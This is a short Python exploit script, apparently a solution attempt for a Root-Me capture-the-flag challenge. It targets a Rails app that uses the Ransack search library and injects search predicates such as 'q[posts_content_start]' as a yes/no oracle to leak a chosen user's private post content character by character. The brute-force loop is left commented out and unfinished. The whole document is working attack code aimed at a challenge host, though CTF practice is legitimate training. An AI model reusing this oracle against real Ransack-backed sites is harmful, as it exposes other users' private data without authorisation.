import requests
import re

class Ransack:
    url = ""
    target = ""

    def __init__(self, url):
        self.url = url

    def setTarget(self, target):
        self.target = target

    def sendPayload(self, payload):
        params = {
            "utf8": "✓",
            "q[email_cont]": self.target,
            "q[posts_content_start]": payload
        }
        r = requests.get(self.url, params=params, allow_redirects=False)
        pattern = r"<h2>\s*No result\s*</h2>"
        return not re.search(pattern, r.content.decode(), re.IGNORECASE)

    def getPost(self):
        if self.target == "":
            print("[-] Target undefined.")
            return

        charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*"

        if self.sendPayload("z"):
            print("Valide")
        else:
            print("Invalide")

        #payload = ""
        #for c in charset:
        #    payload += c
        #    if not self.sendPayload(payload):
        #        payload = payload[:-1]


url     = "http://challenge01.root-me.org:59097/users"
target  = "gwittfeld@example.com"
exploit = Ransack(url)
exploit.setTarget(target)
exploit.getPost()
